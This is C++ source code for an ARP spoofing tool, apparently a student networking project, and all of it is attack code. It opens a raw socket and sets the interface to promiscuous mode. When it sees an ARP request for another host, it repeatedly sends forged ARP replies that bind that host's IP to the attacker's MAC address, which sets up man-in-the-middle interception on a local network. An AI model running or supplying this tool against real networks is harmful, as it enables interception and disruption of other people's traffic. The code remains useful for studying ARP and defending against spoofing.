#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <arpa/inet.h>          // manipulação de endereços IP
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <net/if.h>             // ifr struct
#include <netinet/ether.h>      // header ethernet
#include <netinet/in.h>         // protocol definitions
#include <netinet/in_systm.h>   // tipos de dados (???)
#include <netpacket/packet.h>

#include <csignal>
#include <cstring>
#include <iostream>
#include <iomanip>
#include <mutex>
#include <thread>

#include "colors.h"
#include "helpers.h"
#include "ethernet.h"
#include "arp.h"
#include "ip.h"

using namespace Colors;

void SIGINTHandler(int);

std::mutex runMutex;
int run = 1;

void attack(int socket, int ivalue, BYTE* intMac, const Arp arp)
{
  Arp reply = arp;
  reply.operation = 2;

  memcpy(reply.targetHAddr, reply.senderHAddr, HLEN);
  memcpy(reply.senderHAddr, intMac, HLEN);

  BYTE ipSwap[PLEN];

  memcpy(ipSwap, reply.targetPAddr, PLEN);
  memcpy(reply.targetPAddr, reply.senderPAddr, PLEN);
  memcpy(reply.senderPAddr, ipSwap, PLEN);

  Ethernet ethernet;
  memcpy(ethernet.destination, reply.targetHAddr, HLEN);
  memcpy(ethernet.source, reply.senderHAddr, HLEN);
  ethernet.etherType = 0x0806;

  int size = 0;
  BYTE buff[BUFFSIZE];
  size += ethernet.ToBuffer(&buff[0]);
  size += reply.ToBuffer(&buff[14]);

  std::cout << "Mounting ARP Reply...";
  ok();

  std::cout << std::endl;
  std::cout << ethernet.ToString() << std::endl;
  std::cout << reply.ToString() << std::endl;

  struct sockaddr_ll destAddr;
  destAddr.sll_family = htons(PF_PACKET);
  destAddr.sll_protocol = htons(ETH_P_ALL);
  destAddr.sll_halen = HLEN;
  destAddr.sll_ifindex = 3;
  memcpy(&(destAddr.sll_addr), ethernet.destination, HLEN);

  std::cout << green << "Engaging attack!" << std::endl;
 
  int count = 0;
  while (run)
  {
    runMutex.lock();
    int ret;
    if ((ret = sendto(socket, buff, size, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
			error();
			return;
    }
    count++;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    runMutex.unlock();
  }

  std::cout << "Finish attacking thread (" << (int)count << " packets sent)...";
  ok();
}

int main(int argc, char** argv)
{
  if (argc != 2)
  {
    std::cerr << "Usage: spoofer <interface>" << std::endl;
    exit(-1); 
  }

  BYTE intMac[HLEN];
  BYTE intIp[PLEN];
  std::thread* attackThread = nullptr;

  std::cout << "Capture SIGINT...";

  if (signal(SIGINT, SIGINTHandler) == SIG_ERR)
  {
    error();
    exit(-1);
  }

  ok();
  std::cout << "Create socket...";

  int sockd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sockd < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok(); 
  std::cout << "Retrieve interface index...";

  struct ifreq ifr;
	strcpy(ifr.ifr_name, argv[1]);

	if (ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << "Retrieve interface hardware address...";

  if (ioctl(sockd, SIOCGIFHWADDR, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  MakeMAC((BYTE*)&ifr.ifr_hwaddr.sa_data[0], &intMac[0]);

  ok();
  std::cout << "Retrieve interface protocol address...";

  if (ioctl(sockd, SIOCGIFADDR, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  MakeIP((BYTE*)&ifr.ifr_addr.sa_data[2], &intIp[0]);

  ok();
  std::cout << "Retrieve interface flags... ";

	if (ioctl(sockd, SIOCGIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << "Set interface to PROMISCUOUS mode... ";

	ifr.ifr_flags |= IFF_PROMISC;

	if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << "Start listen for ARP Request on " << ifr.ifr_name << " (" << MACToStr(intMac) << " " << IPToStr(intIp) << ")...";
  ok();
 
	BYTE buff[BUFFSIZE];

  while (run) 
  {
    recv(sockd, (char *) &buff, sizeof(buff), 0x00);

    Ethernet ethernet(&buff[0]);

    if (ethernet.etherType == P_ARP)
    {
      Arp arp(&buff[14]);

      if (arp.operation == 1 && !CompareIP(arp.targetPAddr, intIp))
      {
        std::cout << std::endl << arp.ToString() << std::endl;

        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, intMac, arp);
        break;
      }
    }
	}

  if (attackThread != nullptr)
  {
    attackThread->join();
  }

	ifr.ifr_flags &= ~IFF_PROMISC;  
  std::cout << "Unset interface from PROMISCUOUS mode...";

  if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  close(sockd);

  return 0;
}

void SIGINTHandler(int sig)
{
  std::cout << yellow << "Received signal to interrupt execution. Terminating...\n\n" << reset;
  runMutex.lock();
  run = 0;
  runMutex.unlock();
}

